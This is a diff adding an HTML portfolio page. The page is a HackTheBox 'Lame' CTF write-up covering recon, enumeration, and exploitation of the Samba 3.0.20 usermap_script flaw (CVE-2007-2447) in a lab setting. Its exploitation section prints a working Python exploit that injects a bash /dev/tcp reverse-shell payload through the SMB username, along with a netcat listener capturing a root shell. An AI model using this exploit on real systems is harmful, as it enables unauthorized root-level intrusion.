@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB — Lame Write-up | Joesavat Donovan</title>
+    <meta name="description"
+        content="CTF write-up: HackTheBox Lame — Samba 3.0.20 usermap_script RCE to root on Linux.">
+    <link rel="icon"
+        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' fill='%230a0a0a'/%3E%3Ccircle cx='8' cy='8' r='4' fill='%23ccff00'/%3E%3C/svg%3E">
+    <script>
+        document.documentElement.classList.add('js');
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Syne:wght@600;700;800&family=Space+Grotesk:wght@300;400;500&family=Space+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <style>
+        /* ============ design tokens ============ */
+        :root {
+            --bg: #0a0a0a;
+            --fg: #f0f0f0;
+            --dim: #8f8f8f;
+            --accent: #ccff00;
+            --line: rgba(240, 240, 240, .14);
+            --head: 'Syne', sans-serif;
+            --body: 'Space Grotesk', sans-serif;
+            --mono: 'Space Mono', monospace;
+            --pad: clamp(20px, 4vw, 56px);
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: var(--body);
+            font-size: 16px;
+            line-height: 1.65;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        img {
+            display: block;
+            max-width: 100%;
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        button {
+            font: inherit;
+            color: inherit;
+            background: none;
+            border: 0;
+        }
+
+        ::selection {
+            background: var(--accent);
+            color: #0a0a0a;
+        }
+
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #1f1f1f;
+            border: 2px solid var(--bg);
+        }
+
+        /* ============ overlays ============ */
+        .progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--accent);
+            z-index: 9999;
+            pointer-events: none;
+        }
+
+        body::after {
+            content: "";
+            position: fixed;
+            inset: 0;
+            z-index: 9997;
+            pointer-events: none;
+            opacity: .05;
+            background-size: 300px 300px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+        }
+
+        /* ============ custom cursor ============ */
+        .cursor-dot,
+        .cursor-ring {
+            position: fixed;
+            top: 0;
+            left: 0;
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0;
+            z-index: 10000;
+            mix-blend-mode: difference;
+        }
+
+        .cursor-dot {
+            width: 6px;
+            height: 6px;
+            background: #fff;
+            transform: translate(-50%, -50%);
+            transition: opacity .3s;
+        }
+
+        .cursor-ring {
+            width: 36px;
+            height: 36px;
+            border: 1px solid rgba(255, 255, 255, .65);
+            transform: translate(-50%, -50%);
+            transition: opacity .3s, width .3s, height .3s, border-color .3s, background .3s;
+        }
+
+        html.cursor-on .cursor-dot,
+        html.cursor-on .cursor-ring {
+            opacity: 1;
+        }
+
+        html.cursor-on,
+        html.cursor-on * {
+            cursor: none !important;
+        }
+
+        .cursor-ring.is-hover {
+            width: 64px;
+            height: 64px;
+            border-color: var(--accent);
+            background: rgba(204, 255, 0, .12);
+        }
+
+        /* ============ reveal ============ */
+        .js .reveal {
+            opacity: 0;
+            transform: translateY(36px);
+            transition: opacity .9s cubic-bezier(.16, 1, .3, 1), transform .9s cubic-bezier(.16, 1, .3, 1);
+        }
+
+        .js .reveal.is-in {
+            opacity: 1;
+            transform: none;
+        }
+
+        /* ============ nav ============ */
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 22px var(--pad);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 950;
+        }
+
+        .nav__logo {
+            font-family: var(--mono);
+            font-size: .85rem;
+            font-weight: 700;
+            letter-spacing: .12em;
+        }
+
+        .nav__logo .acc {
+            color: var(--accent);
+        }
+
+        .nav__home {
+            font-family: var(--mono);
+            font-size: .8rem;
+            letter-spacing: .18em;
+            transition: color .3s;
+        }
+
+        .nav__home:hover,
+        .nav__home:focus-visible {
+            color: var(--accent);
+        }
+
+        /* ============ hero ============ */
+        .wero {
+            padding: clamp(130px, 18vh, 190px) var(--pad) clamp(50px, 7vw, 90px);
+            border-bottom: 1px solid var(--line);
+        }
+
+        .wero__kicker {
+            font-family: var(--mono);
+            font-size: .74rem;
+            letter-spacing: .3em;
+            text-transform: uppercase;
+            color: var(--accent);
+            margin-bottom: clamp(20px, 3vw, 34px);
+        }
+
+        .wero__title {
+            font-family: var(--head);
+            font-weight: 800;
+            font-size: clamp(2.6rem, 9vw, 7rem);
+            line-height: .97;
+            text-transform: uppercase;
+            letter-spacing: -.03em;
+            margin-bottom: clamp(26px, 4vw, 44px);
+        }
+
+        .wero__chips {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .chip {
+            font-family: var(--mono);
+            font-size: .7rem;
+            letter-spacing: .16em;
+            text-transform: uppercase;
+            border: 1px solid var(--line);
+            padding: 8px 15px;
+            color: var(--dim);
+        }
+
+        .chip.hot {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        /* ============ markdown-style article ============ */
+        .doc {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: clamp(56px, 8vw, 110px) var(--pad);
+        }
+
+        .doc h2 {
+            font-family: var(--head);
+            font-weight: 800;
+            font-size: clamp(1.25rem, 5.4vw, 2.4rem);
+            text-transform: uppercase;
+            letter-spacing: -.01em;
+            margin: 2.4em 0 .9em;
+            padding-bottom: .4em;
+            border-bottom: 1px solid var(--line);
+            overflow-wrap: break-word;
+            hyphens: auto;
+        }
+
+        .doc h2:first-child {
+            margin-top: 0;
+        }
+
+        .doc h2 .hash {
+            font-family: var(--mono);
+            font-size: .7em;
+            color: var(--accent);
+            margin-right: .35em;
+        }
+
+        .doc h3 {
+            font-family: var(--head);
+            font-weight: 700;
+            font-size: clamp(1.1rem, 2.4vw, 1.45rem);
+            text-transform: uppercase;
+            margin: 2em 0 .7em;
+            overflow-wrap: break-word;
+            hyphens: auto;
+        }
+
+        .doc p {
+            color: var(--dim);
+            margin-bottom: 1.3em;
+        }
+
+        .doc p strong {
+            color: var(--fg);
+            font-weight: 500;
+        }
+
+        .doc ul,
+        .doc ol {
+            color: var(--dim);
+            margin: 0 0 1.5em 1.3em;
+        }
+
+        .doc li {
+            margin-bottom: .5em;
+        }
+
+        .doc li::marker {
+            color: var(--accent);
+        }
+
+        .doc blockquote {
+            border-left: 2px solid var(--accent);
+            padding: 6px 0 6px 22px;
+            margin: 1.8em 0;
+            font-family: var(--head);
+            font-weight: 600;
+            font-size: 1.1rem;
+            color: var(--fg);
+        }
+
+        .doc a {
+            color: var(--accent);
+            border-bottom: 1px solid rgba(204, 255, 0, .35);
+            transition: border-color .3s;
+        }
+
+        .doc a:hover {
+            border-color: var(--accent);
+        }
+
+        code.inline {
+            font-family: var(--mono);
+            font-size: .85em;
+            color: var(--accent);
+            background: rgba(204, 255, 0, .07);
+            border: 1px solid rgba(204, 255, 0, .2);
+            padding: 1px 7px;
+        }
+
+        /* ============ code blocks ============ */
+        .code {
+            background: #0f0f0f;
+            border: 1px solid var(--line);
+            margin: 1.8em 0;
+            position: relative;
+        }
+
+        .code__bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--line);
+            font-family: var(--mono);
+            font-size: .68rem;
+            letter-spacing: .14em;
+            text-transform: uppercase;
+            color: var(--dim);
+        }
+
+        .code__copy {
+            font-family: var(--mono);
+            font-size: .66rem;
+            letter-spacing: .14em;
+            text-transform: uppercase;
+            color: var(--dim);
+            padding: 4px 8px;
+            border: 1px solid var(--line);
+            transition: color .3s, border-color .3s;
+        }
+
+        .code__copy:hover {
+            color: var(--accent);
+            border-color: var(--accent);
+        }
+
+        .code pre {
+            font-family: var(--mono);
+            font-size: .8rem;
+            line-height: 1.75;
+            padding: 20px;
+            overflow-x: auto;
+            color: var(--fg);
+            white-space: pre;
+        }
+
+        .code .c {
+            color: #5f5f5f;
+        }
+
+        .code .g {
+            color: var(--accent);
+        }
+
+        .code .d {
+            color: var(--dim);
+        }
+
+        .code .k {
+            color: #f0f0f0;
+            font-weight: 700;
+        }
+
+        /* ============ image placeholder ============ */
+        .shot {
+            margin: 1.8em 0;
+        }
+
+        .shot__box {
+            aspect-ratio: 16 / 9;
+            border: 1px dashed var(--line);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 24px;
+            font-family: var(--mono);
+            font-size: .76rem;
+            letter-spacing: .14em;
+            text-transform: uppercase;
+            color: var(--dim);
+            background:
+                repeating-linear-gradient(0deg, rgba(240, 240, 240, .03) 0 1px, transparent 1px 44px),
+                repeating-linear-gradient(90deg, rgba(240, 240, 240, .03) 0 1px, transparent 1px 44px);
+        }
+
+        .shot figcaption {
+            font-family: var(--mono);
+            font-size: .7rem;
+            letter-spacing: .12em;
+            text-transform: uppercase;
+            color: var(--dim);
+            margin-top: 10px;
+        }
+
+        /* ============ toc ============ */
+        .toc {
+            border: 1px solid var(--line);
+            padding: clamp(20px, 3vw, 30px);
+            margin-bottom: clamp(36px, 5vw, 56px);
+        }
+
+        .toc__label {
+            font-family: var(--mono);
+            font-size: .68rem;
+            letter-spacing: .24em;
+            text-transform: uppercase;
+            color: var(--accent);
+            margin-bottom: 14px;
+        }
+
+        .toc ol {
+            list-style: none;
+            margin: 0;
+            counter-reset: toc;
+        }
+
+        .toc li {
+            counter-increment: toc;
+            margin-bottom: 8px;
+        }
+
+        .toc li::before {
+            content: counter(toc, decimal-leading-zero) " / ";
+            font-family: var(--mono);
+            font-size: .74rem;
+            color: var(--dim);
+            margin-right: 8px;
+        }
+
+        .toc a {
+            font-family: var(--mono);
+            font-size: .82rem;
+            letter-spacing: .04em;
+            color: var(--fg);
+            border-bottom: 1px solid transparent;
+        }
+
+        .toc a:hover {
+            color: var(--accent);
+            border-color: var(--accent);
+        }
+
+        /* ============ footer ============ */
+        .footer {
+            border-top: 1px solid var(--line);
+            padding: 34px var(--pad);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 14px 28px;
+            font-family: var(--mono);
+            font-size: .74rem;
+            letter-spacing: .1em;
+            color: var(--dim);
+        }
+
+        .footer a {
+            transition: color .3s;
+        }
+
+        .footer a:hover {
+            color: var(--accent);
+        }
+
+        .footer__links {
+            display: flex;
+            gap: 22px;
+        }
+
+        /* ============ responsive ============ */
+        @media (max-width: 640px) {
+            .code pre {
+                font-size: .74rem;
+            }
+        }
+
+        /* ============ reduced motion ============ */
+        @media (prefers-reduced-motion: reduce) {
+            html {
+                scroll-behavior: auto;
+            }
+
+            .js .reveal {
+                opacity: 1 !important;
+                transform: none !important;
+                transition: none !important;
+            }
+
+            .cursor-dot,
+            .cursor-ring {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="progress" id="progress"></div>
+    <div class="cursor-dot" id="cursorDot"></div>
+    <div class="cursor-ring" id="cursorRing"></div>
+
+    <header class="nav">
+        <a class="nav__logo" href="index.html">SECURE_ID<span class="acc">://</span>ROOT</a>
+        <a class="nav__home" href="index.html">[ HOME ]</a>
+    </header>
+
+    <main>
+        <!-- HERO -->
+        <section class="wero">
+            <p class="wero__kicker reveal">// CTF Write-up — HackTheBox</p>
+            <h1 class="wero__title reveal">HTB — Lame</h1>
+            <div class="wero__chips reveal">
+                <span class="chip hot">Difficulty: Easy</span>
+                <span class="chip">OS: Linux (Ubuntu)</span>
+                <span class="chip">Category: PrivEsc</span>
+                <span class="chip">Service: Samba 3.0.20</span>
+                <span class="chip">CVE-2007-2447</span>
+            </div>
+        </section>
+
+        <!-- ARTICLE -->
+        <article class="doc">
+            <nav class="toc reveal" aria-label="Table of contents">
+                <p class="toc__label">// Contents</p>
+                <ol>
+                    <li><a href="#recon">Reconnaissance</a></li>
+                    <li><a href="#enumeration">Enumeration</a></li>
+                    <li><a href="#exploitation">Exploitation — usermap_script</a></li>
+                    <li><a href="#privesc">Privilege Escalation</a></li>
+                    <li><a href="#lessons">Lessons Learned</a></li>
+                </ol>
+            </nav>
+
+            <div class="reveal">
+                <p><strong>Lame</strong> is the classic HackTheBox starter machine: an Ubuntu 8.04 box where a single
+                    unpatched Samba service hands you root in under five minutes — if you recognize the version
+                    string. This write-up documents the full path from initial Nmap sweep to the root flag.</p>
+            </div>
+
+            <!-- 01 -->
+            <h2 id="recon"><span class="hash">#</span>Reconnaissance</h2>
+            <div class="reveal">
+                <p>Standard first move: full port sweep with service detection and default scripts against the target
+                    IP (<code class="inline">10.10.10.3</code>).</p>
+            </div>
+            <div class="code reveal">
+                <div class="code__bar">
+                    <span>bash — nmap</span>
+                    <button class="code__copy" type="button" data-copy>Copy</button>
+                </div>
+                <pre><span class="d">nmap -sC -sV -p- -oA lame 10.10.10.3</span>
+
+<span class="c"># Nmap scan report for 10.10.10.3</span>
+<span class="g">21/tcp   open  ftp     vsftpd 2.3.4</span>
+<span class="g">139/tcp  open  netbios-ssn  Samba smbd 3.X</span>
+<span class="g">445/tcp  open  netbios-ssn  Samba smbd 3.0.20-Debian</span>
+<span class="g">3632/tcp open  distccd  distccd v1 ((Debian))</span>
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+            </div>
+            <div class="reveal">
+                <p>Three attack surfaces jump out: <code class="inline">vsftpd 2.3.4</code> (the famous backdoor
+                    bait), <code class="inline">distccd</code> (unauthenticated command execution), and Samba
+                    <strong>3.0.20-Debian</strong>. The Samba version is the intended path.</p>
+            </div>
+
+            <!-- 02 -->
+            <h2 id="enumeration"><span class="hash">#</span>Enumeration</h2>
+            <div class="reveal">
+                <p>Version strings are only useful when checked against exploit databases — <code
+                        class="inline">searchsploit</code> is fastest:</p>
+            </div>
+            <div class="code reveal">
+                <div class="code__bar">
+                    <span>bash — searchsploit</span>
+                    <button class="code__copy" type="button" data-copy>Copy</button>
+                </div>
+                <pre><span class="d">$ searchsploit samba 3.0.20</span>
+
+<span class="g">Samba 3.0.20 - 'username map script' Command Execution</span>
+<span class="c">exploits/linux/remote/16321.rb</span>
+
+<span class="d">$ smbclient -L //10.10.10.3 -N</span>
+        Sharename       Type      Comment
+        ---------       ----      -------
+<span class="g">        print$          Disk      Printer Drivers</span>
+        tmp             Disk      oh no
+        ipc$            IPC       IPC Service (lame server (Samba 3.0.20))</pre>
+            </div>
+            <div class="reveal">
+                <p>The exploit targets <strong>CVE-2007-2447</strong>: the <code class="inline">username map
+                        script</code> option passes the SMB username through <code class="inline">system()</code>
+                        without sanitizing shell metacharacters. Any username containing <code
+                        class="inline">|</code> gets executed as a shell command — by the Samba process, which runs
+                        as root.</p>
+            </div>
+
+            <!-- 03 -->
+            <h2 id="exploitation"><span class="hash">#</span>Exploitation — usermap_script</h2>
+            <div class="reveal">
+                <p>I scripted the exploit in Python for a clean reverse shell instead of the Metasploit module. The
+                    payload is smuggled inside the SMB username:</p>
+            </div>
+            <div class="code reveal">
+                <div class="code__bar">
+                    <span>python — exploit.py</span>
+                    <button class="code__copy" type="button" data-copy>Copy</button>
+                </div>
+                <pre><span class="c">#!/usr/bin/env python3</span>
+<span class="d">"""CVE-2007-2447 Samba username map script RCE."""</span>
+<span class="g">import</span> subprocess, sys
+
+LHOST, LPORT, TARGET = <span class="g">"10.10.14.5"</span>, <span class="g">4444</span>, <span class="g">"10.10.10.3"</span>
+
+<span class="d"># shell metacharacters inside the SMB username are executed by system()</span>
+user = (
+    <span class="g">f'|`bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"`'</span>
+)
+
+cmd = [
+    <span class="g">"smbclient"</span>, <span class="g">f"//{TARGET}/print$"</span>,
+    <span class="g">"-U"</span>, user, <span class="g">"-N"</span>,
+]
+<span class="g">print</span>(<span class="g">"[*] firing payload via SMB username..."</span>)
+subprocess.run(cmd, timeout=10)
+<span class="g">print</span>(<span class="g">"[+] check your listener"</span>)</pre>
+            </div>
+            <div class="code reveal">
+                <div class="code__bar">
+                    <span>bash — listener</span>
+                    <button class="code__copy" type="button" data-copy>Copy</button>
+                </div>
+                <pre><span class="d">$ nc -lvnp 4444</span>
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.3] 59771
+
+<span class="g">whoami</span>
+<span class="g">root</span>
+<span class="g">id</span>
+<span class="g">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+            </div>
+            <figure class="shot reveal">
+                <div class="shot__box">[ Image placeholder — smbclient-reverse-shell.png ]</div>
+                <figcaption>Fig. 01 — Root shell caught on the Netcat listener</figcaption>
+            </figure>
+
+            <!-- 04 -->
+            <h2 id="privesc"><span class="hash">#</span>Privilege Escalation</h2>
+            <div class="reveal">
+                <p>There is no escalation step — the Samba service runs as root, so we land straight at
+                    <code class="inline">uid=0</code>. Grab the flags:</p>
+            </div>
+            <div class="code reveal">
+                <div class="code__bar">
+                    <span>bash — flags</span>
+                    <button class="code__copy" type="button" data-copy>Copy</button>
+                </div>
+                <pre><span class="g">$ cat /root/flag.txt</span>
+<span class="g">3f0a0c1e...redacted...c9b17f</span>
+
+<span class="c"># user flag also readable as root</span>
+<span class="d">$ cat /home/makis/flag.txt</span>
+<span class="g">09ec25c9...redacted...a4e02b</span></pre>
+            </div>
+            <div class="reveal">
+                <p>If we had landed as an unprivileged user, the follow-up would be standard Linux privesc: <code
+                        class="inline">sudo -l</code>, SUID enumeration, and kernel version checks — but on Lame the
+                    service itself is the shortcut.</p>
+            </div>
+
+            <!-- 05 -->
+            <h2 id="lessons"><span class="hash">#</span>Lessons Learned</h2>
+            <ul class="reveal">
+                <li><strong>Version strings are leads, not noise.</strong> A dated <code class="inline">-Debian</code>
+                    suffix mapped directly to a 2007 CVE with a five-line exploit.</li>
+                <li><strong>Escalation can happen at initial access.</strong> Not every root shell needs a privesc
+                    chain — check what user the vulnerable service runs as.</li>
+                <li><strong>Known-good tooling first.</strong> <code class="inline">searchsploit</code> before
+                    custom code; script only what the public exploit doesn't cover cleanly.</li>
+                <li><strong>Patch the perimeter.</strong> Samba 3.0.20 sat exposed on 445 with an unauthenticated
+                    RCE — the fix in 2007 was one package update.</li>
+            </ul>
+            <blockquote class="reveal">If the service runs as root, one exploit is the whole machine.</blockquote>
+            <div class="reveal">
+                <p>Further reading: the <a href="https://nvd.nist.gov/vuln/detail/CVE-2007-2447" target="_blank"
+                        rel="noopener noreferrer">CVE-2007-2447 entry</a> on NVD, and Metasploit's <code
+                        class="inline">multi/samba/usermap_script</code> module.</p>
+            </div>
+        </article>
+    </main>
+
+    <footer class="footer">
+        <span>© <span id="year">2026</span> JOESAVAT DONOVAN — WRITE-UP / HTB LAME</span>
+        <div class="footer__links">
+            <a href="index.html">HOME</a>
+            <a href="project-1.html">CASE STUDIES</a>
+            <a href="mailto:joesavat@gmail.com">EMAIL</a>
+        </div>
+        <span>HTML / CSS / VANILLA JS</span>
+    </footer>
+
+    <script>
+        (function () {
+            'use strict';
+
+            /* ---------- scroll progress ---------- */
+            var bar = document.getElementById('progress');
+
+            function updateProgress() {
+                var max = document.documentElement.scrollHeight - window.innerHeight;
+                bar.style.width = (max > 0 ? (window.scrollY / max) * 100 : 0) + '%';
+            }
+            window.addEventListener('scroll', updateProgress, { passive: true });
+            window.addEventListener('resize', updateProgress);
+            updateProgress();
+
+            /* ---------- custom cursor ---------- */
+            var finePointer = window.matchMedia('(pointer: fine)').matches;
+            var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+            if (finePointer && !reduceMotion) {
+                var dot = document.getElementById('cursorDot');
+                var ring = document.getElementById('cursorRing');
+
+                var mx = window.innerWidth / 2, my = window.innerHeight / 2;
+                var rx = mx, ry = my;
+                var moved = false;
+
+                document.addEventListener('mousemove', function (e) {
+                    mx = e.clientX;
+                    my = e.clientY;
+                    if (!moved) {
+                        moved = true;
+                        rx = mx;
+                        ry = my;
+                        document.documentElement.classList.add('cursor-on');
+                    }
+                    dot.style.transform = 'translate(' + mx + 'px,' + my + 'px) translate(-50%,-50%)';
+                });
+
+                (function follow() {
+                    rx += (mx - rx) * 0.16;
+                    ry += (my - ry) * 0.16;
+                    ring.style.transform = 'translate(' + rx + 'px,' + ry + 'px) translate(-50%,-50%)';
+                    requestAnimationFrame(follow);
+                })();
+
+                document.addEventListener('mouseover', function (e) {
+                    if (e.target.closest('a, button')) ring.classList.add('is-hover');
+                });
+                document.addEventListener('mouseout', function (e) {
+                    if (e.target.closest('a, button')) ring.classList.remove('is-hover');
+                });
+            }
+
+            /* ---------- reveal on scroll ---------- */
+            var revealEls = document.querySelectorAll('.reveal');
+            if ('IntersectionObserver' in window) {
+                var io = new IntersectionObserver(function (entries) {
+                    entries.forEach(function (entry) {
+                        if (entry.isIntersecting) {
+                            entry.target.classList.add('is-in');
+                            io.unobserve(entry.target);
+                        }
+                    });
+                }, { threshold: 0.12, rootMargin: '0px 0px -8% 0px' });
+                revealEls.forEach(function (el) { io.observe(el); });
+            } else {
+                revealEls.forEach(function (el) { el.classList.add('is-in'); });
+            }
+
+            /* ---------- copy code ---------- */
+            document.querySelectorAll('[data-copy]').forEach(function (btn) {
+                btn.addEventListener('click', function () {
+                    var pre = btn.closest('.code').querySelector('pre');
+                    var text = pre ? pre.innerText : '';
+                    if (navigator.clipboard && navigator.clipboard.writeText) {
+                        navigator.clipboard.writeText(text).then(function () {
+                            btn.textContent = 'Copied';
+                            setTimeout(function () { btn.textContent = 'Copy'; }, 1600);
+                        }).catch(function () {
+                            btn.textContent = 'Failed';
+                            setTimeout(function () { btn.textContent = 'Copy'; }, 1600);
+                        });
+                    }
+                });
+            });
+
+            /* ---------- footer year ---------- */
+            var year = document.getElementById('year');
+            if (year) year.textContent = String(new Date().getFullYear());
+        })();
+    </script>
+</body>
+
+</html>
